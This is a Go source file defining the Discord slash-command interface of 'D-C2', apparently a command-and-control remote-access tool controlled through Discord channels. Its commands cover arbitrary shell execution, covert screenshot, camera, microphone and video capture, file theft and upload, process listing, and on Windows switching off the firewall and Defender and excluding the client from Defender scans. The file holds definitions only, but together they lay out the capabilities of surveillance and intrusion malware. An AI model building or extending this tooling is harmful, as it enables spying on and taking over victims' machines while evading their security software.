package commands

// This file holds the slash-command definitions registered with Discord. It is
// data only: handling lives in the other files in this package.
//
// Commands are grouped by capability so the Discord picker shows one entry per
// category (media, fs, sys, win, dev) instead of a flat list. Discord scopes
// commands to the guild, not the channel, so Definitions filters the Windows
// group by the OS the client runs on.

import "github.com/bwmarrin/discordgo"

// Group names used by the interaction router.
const (
	GroupMedia = "media"
	GroupFS    = "fs"
	GroupSys   = "sys"
	GroupWin   = "win"
	GroupDev   = "dev"
)

// Definitions returns the slash commands this client exposes on goos.
func Definitions(goos string) []*discordgo.ApplicationCommand {
	cmds := []*discordgo.ApplicationCommand{
		{
			Name:        "help",
			Description: "Show D‑C2 help menu for this device channel",
		},
		{
			Name:        "cmd",
			Description: "Run a shell command on this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "command",
					Description: "Shell command to run",
					Required:    true,
				},
			},
		},
		mediaCommand(),
		fsCommand(),
		sysCommand(),
		devCommand(),
	}
	if goos == "windows" {
		cmds = append(cmds, winCommand())
	}
	return cmds
}

// LegacyNames lists the pre-grouping top-level commands. Registration deletes
// these so a guild migrates cleanly to the grouped layout.
func LegacyNames() map[string]bool {
	names := []string{
		"screenshot", "camera", "mic", "record", "recordstop",
		"log", "cwd", "ls", "ps", "pidinfo",
		"winsec", "winfirewall", "windefender", "windefenderexclude",
		"download", "upload", "restart",
	}
	set := make(map[string]bool, len(names))
	for _, n := range names {
		set[n] = true
	}
	return set
}

func mediaCommand() *discordgo.ApplicationCommand {
	return &discordgo.ApplicationCommand{
		Name:        GroupMedia,
		Description: "Media capture and recording",
		Options: []*discordgo.ApplicationCommandOption{
			sub("screenshot", "Capture screenshots of all displays"),
			sub("camera", "Capture a snapshot from the default camera"),
			sub("mic", "Record from the microphone",
				optInt("duration", "Duration in seconds (1-300)", false),
				optString("path", "Destination file path on this device", false, nil),
			),
			sub("record", "Record segmented video for Discord upload",
				optString("source", "Recording source: camera or screen", true, choices("camera", "screen")),
				optInt("max_size_mb", "Maximum size per file in MB (1-8)", false),
				optInt("duration_minutes", "Total recording duration in minutes", false),
				optInt("max_parts", "Maximum number of segments to record (1-30)", false),
				optString("quality", "Video quality", false, choices("low", "medium", "high")),
			),
			sub("recordstop", "Stop the current video recording"),
		},
	}
}

func fsCommand() *discordgo.ApplicationCommand {
	return &discordgo.ApplicationCommand{
		Name:        GroupFS,
		Description: "Filesystem navigation and transfer",
		Options: []*discordgo.ApplicationCommandOption{
			sub("cwd", "Show current working directory"),
			sub("ls", "List a directory",
				optString("path", "Directory to list (empty for current directory)", false, nil),
			),
			sub("download", "Download a file from this device",
				optString("source", "Source file path on this device", true, nil),
				optString("destination", "Destination label (for your reference)", false, nil),
			),
			sub("upload", "Upload an attachment to this device",
				optAttachment("source", "Source attachment to upload"),
				optString("destination", "Destination file path on this device", true, nil),
			),
		},
	}
}

func sysCommand() *discordgo.ApplicationCommand {
	return &discordgo.ApplicationCommand{
		Name:        GroupSys,
		Description: "System information and logging",
		Options: []*discordgo.ApplicationCommandOption{
			sub("ps", "List running processes"),
			sub("pidinfo", "Show information about a specific process ID",
				optInt("pid", "Process ID to inspect", true),
			),
			sub("log", "Stream or stop Go logs into this channel",
				optString("mode", "on or off", true, choices("on", "off")),
			),
		},
	}
}

func winCommand() *discordgo.ApplicationCommand {
	return &discordgo.ApplicationCommand{
		Name:        GroupWin,
		Description: "Windows firewall and Defender controls",
		Options: []*discordgo.ApplicationCommandOption{
			sub("sec", "Show firewall and Defender status"),
			sub("firewall", "Turn Windows firewall on or off",
				optString("mode", "on or off", true, choices("on", "off")),
			),
			sub("defender", "Turn Defender real-time protection on or off",
				optString("mode", "on or off", true, choices("on", "off")),
			),
			sub("exclude", "Exclude a path from Defender scans",
				optString("path", "Path to exclude (empty for current executable)", false, nil),
			),
		},
	}
}

func devCommand() *discordgo.ApplicationCommand {
	return &discordgo.ApplicationCommand{
		Name:        GroupDev,
		Description: "Client process control",
		Options: []*discordgo.ApplicationCommandOption{
			sub("restart", "Restart this client process"),
		},
	}
}

func sub(name, description string, options ...*discordgo.ApplicationCommandOption) *discordgo.ApplicationCommandOption {
	return &discordgo.ApplicationCommandOption{
		Type:        discordgo.ApplicationCommandOptionSubCommand,
		Name:        name,
		Description: description,
		Options:     options,
	}
}

func optString(name, description string, required bool, opts []*discordgo.ApplicationCommandOptionChoice) *discordgo.ApplicationCommandOption {
	return &discordgo.ApplicationCommandOption{
		Type:        discordgo.ApplicationCommandOptionString,
		Name:        name,
		Description: description,
		Required:    required,
		Choices:     opts,
	}
}

func optInt(name, description string, required bool) *discordgo.ApplicationCommandOption {
	return &discordgo.ApplicationCommandOption{
		Type:        discordgo.ApplicationCommandOptionInteger,
		Name:        name,
		Description: description,
		Required:    required,
	}
}

func optAttachment(name, description string) *discordgo.ApplicationCommandOption {
	return &discordgo.ApplicationCommandOption{
		Type:        discordgo.ApplicationCommandOptionAttachment,
		Name:        name,
		Description: description,
		Required:    true,
	}
}

func choices(values ...string) []*discordgo.ApplicationCommandOptionChoice {
	out := make([]*discordgo.ApplicationCommandOptionChoice, 0, len(values))
	for _, v := range values {
		out = append(out, &discordgo.ApplicationCommandOptionChoice{Name: v, Value: v})
	}
	return out
}
